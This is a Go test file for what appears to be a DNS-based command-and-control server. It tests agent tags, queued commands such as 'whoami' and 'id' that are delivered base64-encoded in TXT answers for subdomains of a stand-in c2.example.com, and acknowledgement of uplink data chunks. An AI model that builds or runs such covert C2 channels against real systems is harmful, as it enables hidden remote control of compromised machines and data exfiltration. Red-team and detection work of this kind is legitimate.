package services

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestAgentDNSTagLength(t *testing.T) {
	tag := AgentDNSTag("550e8400-e29b-41d4-a716-446655440000")
	if len(tag) != 12 {
		t.Fatalf("tag len %d", len(tag))
	}
	// Stable
	if AgentDNSTag("550e8400-e29b-41d4-a716-446655440000") != tag {
		t.Fatal("tag not stable")
	}
}

func TestFormatDNSTxtAliveAndCmd(t *testing.T) {
	uuid := "agent-test-uuid-001"
	tag := AgentDNSTag(uuid)
	DNSRegisterTouch(uuid)

	// No pending → alive
	ans := FormatDNSTxtAnswer("cdn." + tag + ".c2.example.com.")
	if ans != "alive" {
		t.Fatalf("expected alive got %q", ans)
	}

	DNSEnqueueCommand(uuid, "whoami")
	ans = FormatDNSTxtAnswer("static." + tag + ".c2.example.com.")
	if !strings.HasPrefix(ans, "cmd:") {
		t.Fatalf("expected cmd: got %q", ans)
	}
	b64 := strings.TrimPrefix(ans, "cmd:")
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || string(raw) != "whoami" {
		t.Fatalf("decode %v %q", err, raw)
	}

	// Second poll empty again
	ans = FormatDNSTxtAnswer("api." + tag + ".c2.example.com.")
	if ans != "alive" {
		t.Fatalf("expected alive after pop, got %q", ans)
	}
}

func TestFormatDNSUplinkOk(t *testing.T) {
	tag := AgentDNSTag("uplink-agent")
	ans := FormatDNSTxtAnswer("d0.chunkdata." + tag + ".zone.example.")
	if ans != "ok" {
		t.Fatalf("uplink want ok got %q", ans)
	}
}

func TestLegacyPingPrefix(t *testing.T) {
	uuid := "legacy-ping-agent"
	tag := AgentDNSTag(uuid)
	DNSEnqueueCommand(uuid, "id")
	ans := FormatDNSTxtAnswer("ping." + tag + ".c2.test.")
	if !strings.HasPrefix(ans, "cmd:") {
		t.Fatalf("legacy ping should still deliver cmd, got %q", ans)
	}
}
